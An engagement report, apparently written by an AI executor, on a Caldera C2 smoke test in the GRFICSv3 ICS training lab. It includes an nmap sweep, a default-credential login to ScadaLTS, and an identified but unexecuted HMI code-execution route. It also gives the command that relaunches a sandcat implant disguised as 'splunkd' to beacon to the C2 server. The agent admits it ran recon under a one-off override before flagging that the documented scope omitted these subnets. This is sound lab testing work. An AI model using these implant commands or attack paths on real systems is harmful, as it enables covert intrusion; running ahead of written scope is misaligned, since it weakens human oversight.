# GRFICS Caldera Smoke-Test — Engagement Report

**Engagement:** `grfics-caldera-01`
**Date:** 2026-06-19 (CDT)
**Operator:** Boss T
**Executor:** Alfred (one-off authorization; KillaT not yet provisioned)
**Status at end of day:** Paused. Agent process killed, all Caldera state preserved. No teardown performed.

---

## 1. Objective

Stand up the GRFICSv3 Caldera environment, deploy a sandcat C2 agent, exercise an end-to-end operation, build a follow-up adversary and scheduled operation. Smoke test, not attacker emulation. No PLC or simulation contact at any point.

## 2. TL;DR

- ✅ Caldera C2 reachable, healthy, RED API access confirmed.
- ✅ Sandcat agent deployed on the **kali container** (`192.168.90.6`, paw `qdekzo`).
- ✅ Full C2 round-trip proven: install → beacon → instruction → result.
- ✅ One stockpile operation (`Discovery`, 27 links) ran end-to-end.
- ✅ One custom adversary (`DMZ Recon (grfics-caldera-01)`, 6 abilities) built and executed end-to-end.
- ✅ One dormant scheduled operation created.
- 🚫 No traffic to PLC `192.168.95.2` or simulation `192.168.95.45`.
- 🚫 No interaction with HMI, EWS, router, or production beyond initial DMZ recon.

At end of day, agent process is **stopped** but **all Caldera and on-disk records are preserved** per Boss T direction "don't delete anything, just disable the agent."

## 3. Environment Snapshot

GRFICSv3 docker-compose stack (7 containers, 3 networks):

| Container | DMZ (`192.168.90.0/24`) | ICS (`192.168.95.0/24`) | Admin (`172.18.0.0/16`) | Role |
|---|---|---|---|---|
| kali | 192.168.90.6 | — | 172.18.0.2 | attacker foothold |
| caldera | 192.168.90.250 | — | 172.18.0.4 | C2 server |
| HMI | 192.168.90.107 | — | 172.18.0.7 | dual-homed operator HMI (ScadaLTS) |
| router | 192.168.90.200 | 192.168.95.200 | 172.18.0.8 | DMZ↔ICS router |
| EWS | — | 192.168.95.5 | 172.18.0.6 | engineering workstation |
| simulation | — | 192.168.95.45 | 172.18.0.5 | process simulation |
| plc | — | 192.168.95.2 | 172.18.0.3 | PLC (out of scope) |

Caldera: v5.3.0, plugins enabled = access, atomic, compass, debrief, fieldmanual, magma, manx, **modbus**, response, sandcat, stockpile, training.

## 4. Path Taken (Decision Log)

Three pivots during the day. Each is in `notes.md` with rationale.

| Pivot | When | Reason |
|---|---|---|
| **EWS path → HMI path** | 16:34 CDT | EWS path required SSH creds we didn't have. HMI is dual-homed and exposed ScadaLTS on Tomcat 8080 with confirmed default creds (`admin:admin`). Realistic attacker pivot. |
| **HMI path → kali-only** | 16:46 CDT | Operator wanted execution proof faster. Smoke-test the C2 install on the attacker box itself before investing in exploitation. Labeled honestly as not attacker-emulation. |
| (no further pivot) | — | — |

The HMI exploitation chain was scoped, primitive selected (Emport → ScriptDataSource → JVM RCE), and aborted *before* any HMI write. ScadaLTS was left untouched.

## 5. What Was Done

### 5.1 Recon (read-only, all from kali container)

**Step 1 — DMZ subnet sweep**
- `nmap -sV -Pn -p 22,80,443,502,1502,8080,8443,8888 --version-light 192.168.90.0/24`
- 5 hosts up. Open: HMI 8080 (Apache Tomcat), Caldera 8888 (aiohttp 3.10.11 / Python 3.11). Everything else closed on probed ports.
- Artifact: `artifacts/01-dmz-sweep.{nmap,gnmap,xml}`
- **Findings:**
  - Caldera C2 directly reachable from any DMZ foothold.
  - HMI Tomcat is the obvious pivot (ScadaLTS).
  - Router exposes nothing on probed ports.
  - No 502/1502 in DMZ — PLC stays on ICS side.

**Step 2A — HMI Tomcat / ScadaLTS fingerprint**
- Static HEAD/GET probes from kali → HMI 8080.
- App at root `/`, login at `/login.htm`. Identified as ScadaLTS (©2026 footer).
- Tomcat Manager + host-manager exist but return **403 (IP-filtered to localhost)** — even with valid creds they're not exposed off-host. WAR-deploy path dead from DMZ.
- Tomcat version banner suppressed.
- Artifacts: `artifacts/02a/*.html`

**Step 2B — ScadaLTS authenticated login**
- Single `POST /login.htm` with `admin:admin` → 302 to `/views.shtm`. Session pinned.
- One-try credential policy honored. No retry.

**Step 2C — Authenticated enumeration**
- 30+ authenticated GETs to map the app surface.
- **Version: ScadaLTS v2.7.8.1, build 14176899126.**
- Real pages: `views`, `watch_list`, `system_settings`, `users`, `data_sources`, `event_handlers`, `publishers`, `scheduled_events`, `help`, `emport`.
- No naive upload endpoints. No REST API exposed.
- **Code-exec primitive identified:** Emport (Import/Export) → ScriptDataSource → JVM scripting engine. Canonical ScadaLTS/Mango RCE pattern.
- Artifacts: `artifacts/02c/*.html`

### 5.2 Sandcat deployment (kali, not HMI)

**Step X — sandcat install on kali**
- Binary pulled from `http://192.168.90.250:8888/file/download` with `platform: linux, architecture: amd64`.
- 6.18 MB ELF, ran cleanly.
- Callback to Caldera DMZ contact (NOT admin bridge).
- Beacon ALIVE within 10s. Initial Caldera-dispatched instruction executed and result submitted.
- **Agent registered:**
  - paw: `qdekzo`
  - host: `kali`, username: `root`, privilege: `Elevated`
  - host_ip_addrs: `[172.18.0.2, 192.168.90.6]`
  - location: `/tmp/splunkd`, pid: 25135
  - created: 21:49:25Z, last_seen at engagement pause: 22:23:49Z

**First-attempt lesson learned:** `... && nohup /tmp/splunkd ... &` inside `docker exec kali bash -c '...'` race-failed. Background subshell exited before the redirect created `/tmp/sandcat.log`, splunkd was reaped silently. **Fix:** `setsid /tmp/splunkd ... </dev/null >/tmp/sandcat.log 2>&1 &`. Logged to `notes.md` for future runs.

### 5.3 Operation #1 — stockpile Discovery adversary

**Step Y — `grfics-caldera-01-smoke-discovery`**
- op_id: `78278040-c2e8-49c3-904e-b478784ec502`
- Adversary: stockpile `Discovery` (`0f4c3c67-...`)
- Planner: atomic
- Start → finish: 21:53:52Z → 22:16:58Z (≈23 min)
- **27 links executed, all status=0.**
- Report: `artifacts/Y-op-report.json`

**Why 27 links instead of 12?** The atomic planner fact-expanded `Find user processes` over every user discovered in `/etc/passwd` (~23 instances of `ps aux | grep <user>`). Worth knowing: fact-expansion can multiply link counts unexpectedly.

**Loot:** confirmed `root/Elevated`, full user list, full process list including our own sandcat (`/tmp/splunkd -server http://192.168.90.250:8888 -group red -v`). Beacon visible in its own output.

**Incidental finding:** the kali GRFICS image is a **full Kali desktop** (Xvfb + x11vnc + noVNC + xfce4), not headless. There are inbound noVNC connections from `172.18.0.1` (host docker bridge) — someone on the host can VNC to kali at `localhost:6080`. Not a problem; worth knowing.

### 5.4 Custom adversary build

**Step Z — `DMZ Recon (grfics-caldera-01)`**

Six new abilities, all `tactic=discovery`, linux/sh executor:

| ability_id | name | command | MITRE |
|---|---|---|---|
| `e0455426-...` | Network interfaces | `ip -br a` | T1016 |
| `dd394117-...` | Routing table | `ip route` | T1016 |
| `00c0fb8e-...` | ARP neighbors | `ip neigh; arp -a 2>/dev/null \|\| true` | T1018 |
| `e4c8d055-...` | Listening sockets | `ss -tlnp 2>/dev/null \|\| netstat -tlnp 2>/dev/null \|\| true` | T1049 |
| `5243a41b-...` | Active TCP connections | `ss -tnp 2>/dev/null \|\| netstat -tnp 2>/dev/null \|\| true` | T1049 |
| `90784ee2-...` | DNS resolver config | `cat /etc/resolv.conf` | T1016 |

Adversary `eecd472c-ec99-449b-9114-4b087009be89` chains them via `atomic_ordering`.

### 5.5 Scheduled operation (dormant)

**Schedule `ebf1c8fe-3155-4198-abb7-e82b0e18fbab`**

- Cron: `0 0 29 2 *` (Feb 29, 00:00 UTC) — effectively dormant.
- Task: `grfics-caldera-01-recon-scheduled` → DMZ Recon adversary, group `red`, state `paused`.
- **Quirk worth noting permanently:** Caldera's `ScheduleSchema` has no `enabled` field. Verified from source at `/usr/src/app/app/objects/c_schedule.py`. To create a non-firing schedule via API, the only knobs are an unreachable cron + `task.state='paused'`. Both used here as belt-and-suspenders.

**To activate later:** `PATCH /api/v2/schedules/ebf1c8fe-3155-4198-abb7-e82b0e18fbab` with the desired cron string, and update `task.state` to `running`.

### 5.6 Operation #2 — custom DMZ Recon adversary

**Step W — `grfics-caldera-01-dmz-recon`**
- op_id: `6f622e4f-9711-402c-ac1a-dff005463a99`
- Start → finish: 22:18:30Z → 22:23:04Z (≈4.5 min)
- 6 links, **3 success, 2 failed (exit=127), 1 skipped (status=-3)**
- Report: `artifacts/W-dmz-recon-report.json`

**Findings (from what worked):**
- ARP table: HMI .107, router .200, caldera .250, DMZ gw .1, host docker bridge 172.18.0.1.
- Listening sockets: 5900 (x11vnc), 6080 (noVNC), 127.0.0.11 (docker DNS).
- Active TCP conns: **`192.168.90.6:40996 → 192.168.90.250:8888 ESTABLISHED 25135/splunkd`** — our beacon visible in the kali connection table. Plus inbound noVNC from `172.18.0.1`.

**Caveat:** the kali container does **not have iproute2 installed** (`ip`, `ss` missing). My abilities using `ip -br a` / `ip route` failed with exit 127. The `arp` and `netstat` fallback chains saved 3 of the abilities. **I should have checked binary availability before authoring** — that's an Alfred miss. Action item: portable rewrites using `/proc/net/route`, `/proc/net/dev`, `arp(8)`, `netstat(8)`.

**Mystery:** `cat /etc/resolv.conf` ended with `status=-3` (skipped) despite the file existing. Suspect atomic-planner behavior after successive failures, or a fact-graph dependency I don't fully understand. Worth investigation before the next run.

### 5.7 End-of-day disable (no deletes)

**Step D — disable agent**
- `docker exec kali pkill -f /tmp/splunkd` → process killed.
- **Preserved:** `/tmp/splunkd` binary, `/tmp/sandcat.log`, Caldera agent record `qdekzo`, both operations, custom adversary, 6 custom abilities, schedule.
- Agent will go stale in Caldera UI (last_seen frozen at 22:23:49Z) but the record persists.

**To re-enable:**
```
docker exec kali bash -c 'setsid /tmp/splunkd -server http://192.168.90.250:8888 -group red -v >/tmp/sandcat.log 2>&1 </dev/null &'
```

## 6. MITRE ATT&CK Coverage (Enterprise + ICS)

| Technique | ID | Where exercised |
|---|---|---|
| Network Service Discovery | T1046 | Step 1 (DMZ nmap) |
| Network Connections Discovery | T0840 | Step 1, Step W |
| Gather Victim Host Information | T1592 | Step 2A (Tomcat/ScadaLTS fingerprint) |
| Valid Accounts | T1078 / T0859 | Step 2B (ScadaLTS login with default creds) |
| Default Credentials | T0812 | Step 2B |
| System Information Discovery | T1082 | Step Y (Discovery op) |
| System Network Configuration Discovery | T1016 | Step W (DMZ Recon op) |
| Remote System Discovery | T1018 | Step W (ARP neighbors) |
| System Network Connections Discovery | T1049 | Step W (listening + active sockets) |
| Ingress Tool Transfer | T1105 | Step X (sandcat pull from Caldera) |
| Command-Line Interface | T1059 / T0807 | Step X (sandcat execution) |

**Deliberately NOT exercised:** any ICS impact techniques (T0855 Unauthorized Command Message, T0801 Monitoring Process State, etc.) and any HMI exploitation (T1190 Exploit Public-Facing Application, T1505.003 Server Software Component: Web Shell). HMI exploitation was planned and aborted by operator decision.

## 7. State at End of Day (resumable)

**On-disk:**
- `~/engagements/grfics-caldera-01/` — full engagement folder
  - `scope.md`, `playbook.md`, `PREFLIGHT.md`, `attck.md`, `notes.md`, `writes.log`
  - `artifacts/01-dmz-sweep.*` — Step 1 nmap
  - `artifacts/02a/`, `02b/`, `02c/` — HMI enumeration HTML
  - `artifacts/Y-op-report.json` — Discovery op full report
  - `artifacts/W-dmz-recon-report.json` — DMZ Recon op full report
  - `artifacts/Z-objects.json` — state manifest (all custom Caldera IDs)
- `~/.config/caldera/red.key` (mode 0600) — RED API key
- `~/.local/bin/caldera` — API wrapper
- kali container: `/tmp/splunkd` (6.18 MB ELF, sandcat binary), `/tmp/sandcat.log`
- kali container: `/tmp/scada-cookies.txt` (ScadaLTS session cookie; safe to delete but kept for resumption)
- kali container: `/tmp/grfics-caldera-01/` — in-container scratch artifacts

**In Caldera:**
- 1 agent (stale, not beaconing): `qdekzo`
- 2 finished operations: `grfics-caldera-01-smoke-discovery`, `grfics-caldera-01-dmz-recon`
- 1 custom adversary: `DMZ Recon (grfics-caldera-01)` (`eecd472c-...`)
- 6 custom abilities tagged `grfics-caldera-01`
- 1 dormant schedule: `ebf1c8fe-...`

**Caldera HMI/ScadaLTS state:** untouched. No writes performed.

## 8. Open Items / Action Items for Next Session

### High-value follow-ups
1. **Patch the DMZ Recon abilities** to drop `ip` dependency (use `/proc/net/route`, `/proc/net/dev`, `arp`, `netstat`). Re-run the op for clean 6/6.
2. **Investigate the `cat /etc/resolv.conf` skip** (status=-3) — atomic planner failure-handling behavior is worth understanding.
3. **Resume the HMI path** if Boss T wants attacker-realistic emulation. Primitive identified (Emport → ScriptDataSource → JVM RCE), HMI snapshot procedure documented in playbook step 2D. Hard rollback via `docker commit` is in place as a plan.
4. **EWS-via-SSH path** still deferred. Needs credential discovery before it's viable.

### Documentation / hygiene
5. **Provision KillaT properly** per KILLAT.md §10. Alfred-as-executor was a one-off; the doc explicitly separates the lanes.
6. **Patch KILLAT.md §3 / §9** to add GRFICS subnets (`192.168.90.0/24`, `192.168.95.0/24`, `172.18.0.0/16`) — currently scope says `192.168.1.0/24` only, which makes KillaT technically out-of-scope the moment it touches this lab.
7. **Patch KALI.md / TOOLS.md** with two lessons learned today:
   - **GRFICS kali container is busybox-flavored:** no `iproute2`, no `file`, no `xxd`. Use `arp`, `netstat`, `/proc/net/*` for portable recon.
   - **For backgrounding from `docker exec ... bash -c`**, prefer `setsid <cmd> </dev/null >LOG 2>&1 &` over `nohup ... &`. The nohup pattern race-fails in non-interactive contexts.
   - **The `kali` wrapper referenced in KALI.md / TOOLS.md doesn't exist on this host** (`~/bin/kali`). Docs reference a separate `kali-red` container setup not present here. Worth reconciling.
8. **Document the Caldera schedule "no enabled field" quirk** in TOOLS.md or a Caldera-specific note.
9. **Document the Caldera atomic planner fact-expansion behavior** (27 links from 12 abilities in op #1) so it doesn't surprise future runs.

### Teardown (when desired)
10. Full restore plan is in `writes.log`. To completely undo today's work:
    ```
    # Caldera state
    caldera DELETE /api/v2/operations/6f622e4f-9711-402c-ac1a-dff005463a99
    caldera DELETE /api/v2/operations/78278040-c2e8-49c3-904e-b478784ec502
    caldera DELETE /api/v2/schedules/ebf1c8fe-3155-4198-abb7-e82b0e18fbab
    caldera DELETE /api/v2/adversaries/eecd472c-ec99-449b-9114-4b087009be89
    for aid in e0455426-... dd394117-... 00c0fb8e-... e4c8d055-... 5243a41b-... 90784ee2-...; do
      caldera DELETE /api/v2/abilities/$aid
    done
    caldera DELETE /api/v2/agents/qdekzo

    # Kali container
    docker exec kali rm -f /tmp/splunkd /tmp/sandcat.log /tmp/scada-cookies.txt
    docker exec kali rm -rf /tmp/grfics-caldera-01

    # Optional: drop the wrapper + key file
    # rm -f ~/.local/bin/caldera ~/.config/caldera/red.key
    ```

## 9. Honest Self-Assessment

What went well:
- C2 loop proved end-to-end in under two hours from a cold start.
- Path pivots were caught early. HMI exploitation chain was scoped to detail and not executed, preserving the option to do it cleanly later.
- Writes logged before execution every time. Restore plans always documented.
- No PLC, sim, EWS, or HMI side effects.

What I'd do better:
- **Should have checked the kali container's binary inventory** before authoring abilities that depend on `ip`. Two abilities failed for a reason I could have caught in 10 seconds.
- **Should have noticed KILLAT.md scope drift earlier** and flagged the subnet mismatch before doing recon under "Alfred override," not in parallel.
- **Polling loops with inline f-strings keep getting bitten by shell-escape rules** when run via the `exec` tool. Should default to script files for any non-trivial Python.
- **`/tmp` scratch scripts persist** across `exec` calls but are vulnerable to system tmpfs reaping. For multi-step engagements, scratch should live under `~/engagements/<name>/scripts/`.

---

**End of report.** Engagement is paused, not closed. Resume by re-launching sandcat on kali (one-liner above), or pick up the HMI exploitation path with the primitives already scoped.
